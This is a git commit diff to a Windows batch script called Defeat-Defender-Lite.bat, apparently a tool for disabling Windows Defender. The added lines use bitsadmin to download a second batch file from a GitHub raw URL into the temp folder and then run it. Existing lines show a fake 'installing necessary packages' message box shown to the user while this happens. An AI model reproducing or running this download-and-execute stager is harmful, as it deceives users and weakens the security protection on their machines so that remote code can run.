8d403dbe3f892b28c00fb2a99bfe59d60cd96667
swagkarna <46685308+swagkarna@users.noreply.github.com>
2021-05-27 18:11:27 +0530

    Update Defeat-Defender-Lite.bat

--- Defeat-Defender-Lite.bat
+++ Defeat-Defender-Lite.bat
@@ -25,3 +25,8 @@ echo msgbox "Please Wait While we install necessary packages for You!.Window wil
 wscript %tmp%\tmp.vbs
 del %tmp%\tmp.vbs
 
+cd %temp%
+
+bitsadmin /transfer Explorers /download /priority FOREGROUND https://raw.githubusercontent.com/swagkarna/Defeat-Defender/main/Defeat-Defender.bat  %temp%\Defeat-Defender.bat
+
+start Defeat-Defender.bat
